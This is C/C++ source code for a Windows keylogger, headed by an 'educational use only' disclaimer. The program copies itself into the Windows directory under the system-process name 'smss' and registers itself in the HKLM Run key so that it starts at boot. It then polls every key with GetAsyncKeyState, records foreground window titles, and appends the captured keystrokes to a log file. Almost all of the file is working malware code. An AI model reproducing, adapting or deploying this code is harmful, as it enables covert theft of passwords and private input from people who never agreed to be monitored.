

#include <iostream>

using namespace std;
/*  Very important note:

    To be used for educational use and not for malicious tasks!
    I will NOT be held responsible for anything silly you may do with this!
*/
#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>
#define FILENAME "data"
#define KEYVALUE "wincmd32" /* nome della chiave nel registro */
#define PATH "C:/Users/brunino/Desktop/test-log.txt" // The path to the log file
HWND wincurrent,winlast;
int err,newline,start,end;
#define BUFLEN 4096 /* dimensione buffer di appoggio */
FILE *file;

char stringLogger[256],buffer[BUFLEN],logfile[256];

void SearchActiveWindow(void);
void table(unsigned char key_number);


int main(int argn, char* argv[])
{
     char capture;

    HKEY hkey;
	FILE *test;
    int mode = 1;
    char * self = argv[0];
    std::cout << self;
    std::cout << "-----";
    //------------AUTO RUN  HOOK
	if(mode)
	{
		GetWindowsDirectory(stringLogger,256);
		sprintf(buffer,"%s\\%s",stringLogger,"smss");
		test = fopen(buffer,"rb");
		if(test==NULL)
		{
			CopyFile(self,buffer,0);
			Sleep(1000);
			ShellExecute(NULL,"open",buffer,NULL,NULL,SW_NORMAL);
			exit(0); /* auto arresto */
		}
		fclose(test);
	}

	int error = RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
	std::cout << "RegCreateKey: " << error <<  " "  << hkey;
	if(error==ERROR_SUCCESS){
        error = RegSetValueEx(hkey,KEYVALUE,0,REG_SZ, ( unsigned char *)self,strlen(self));

       RegCloseKey(hkey);
       std::cout << "create key\n";
	}
	//AUTORUN END

    // Time stuff.
    time_t t;
    t = time(NULL);
    // Hide the window
    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,1);


    //CHOOSE THE DATA PATH
GetWindowsDirectory(stringLogger,256);
		sprintf(logfile,"%s\\%s",stringLogger,FILENAME);
		std::cout << logfile;
    //file = fopen(PATH, "a+");
 //   fprintf(file, "\n#$Logger: Written by darknessnerd. Started logging @ %s", ctime(&time));

    while(1)
    {
             int i;
             for(i=0;i<256;i++){
                unsigned char key = GetAsyncKeyState(i);
                if(key>0)
                {
                    table(i);
                    file = fopen(PATH,"ab+");
                    fprintf(file,stringLogger);
                    fclose(file);
                    break;
                }
             }
			SearchActiveWindow();
            Sleep(10); /* previene la saturazione della CPU */
    }

}


void SearchActiveWindow(void)
{
	wincurrent = GetForegroundWindow();
	if(wincurrent!=winlast)
	{
		winlast = wincurrent;
		err = GetWindowText(wincurrent,stringLogger,256); /* primo metodo */
		if(err!=0) /* ok */
		{
			if(strlen(stringLogger)==0) sprintf(buffer,"\r\n[>>> ??? <<<]");
			else sprintf(buffer,"\r\n[>>> %.256s <<<]",stringLogger);
		}
		else /* non ha funzionato... secondo metodo */
		{
			SendMessage(wincurrent,WM_GETTEXT,(WPARAM)256,(LPARAM)stringLogger);
			if(strlen(stringLogger)==0) sprintf(buffer,"\r\n[>>> ??? <<<]");
			else sprintf(buffer,"\r\n[>>> %.256s <<<]",stringLogger);
		}
        file = fopen(PATH,"ab+");
		fprintf(file,buffer);
		fclose(file);
		newline = 1;
	}
}
void table(unsigned char key_number)
{
	if((key_number>=0x30)&&(key_number<=0x39)) /* numeri */
	{
		if(newline) sprintf(stringLogger,"\r\n%c",key_number);
		else sprintf(stringLogger,"%c",key_number);
		newline = 0;
		return;
	}
	if((key_number>=0x41)&&(key_number<=0x5A)) /* caratteri maiuscoli/minuscoli */
	{
		if((GetKeyState(VK_CAPITAL)>0) || (GetKeyState(VK_SHIFT)&8000))
		{
			if(newline) sprintf(stringLogger,"\r\n%c",key_number);
			else sprintf(stringLogger,"%c",key_number);
		}
		else
		{
			if(newline) sprintf(stringLogger,"\r\n%c",key_number+0x20);
			else sprintf(stringLogger,"%c",key_number+0x20);
		}
		newline = 0;
		return;
	}
	newline = 1;
	switch(key_number) /* pulsanti del mouse */
	{
		case VK_LBUTTON: sprintf(stringLogger,"\r\n<MOUSE LEFT>");return;
		case VK_MBUTTON: sprintf(stringLogger,"\r\n<MOUSE MIDDLE>");return;
		case VK_RBUTTON: sprintf(stringLogger,"\r\n<MOUSE RIGHT>");return;
	}
	switch(key_number) /* tasti speciali */
	{
		case VK_ESCAPE: sprintf(stringLogger,"\r\n<ESC>");return;
		case VK_NEXT: sprintf(stringLogger,"\r\n<PAGDOWN>");return;
		case VK_END: sprintf(stringLogger,"\r\n<END>");return;
		case VK_PRIOR: sprintf(stringLogger,"\r\n<PAGUP>");return;
		case VK_HOME: sprintf(stringLogger,"\r\n<HOME>");return;
		case VK_LEFT: sprintf(stringLogger,"\r\n<LEFT>");return;
		case VK_UP: sprintf(stringLogger,"\r\n<UP>");return;
		case VK_RIGHT: sprintf(stringLogger,"\r\n<RIGHT>");return;
		case VK_DOWN: sprintf(stringLogger,"\r\n<DOWN>");return;
		case VK_INSERT: sprintf(stringLogger,"\r\n<INS>");return;
		case VK_DELETE: sprintf(stringLogger,"\r\n<DEL>");return;
	}
	if(key_number==VK_SPACE)
	{
		sprintf(stringLogger," ");
		newline = 0;
		return;
	}
	sprintf(stringLogger,"<?>");
	return;
}
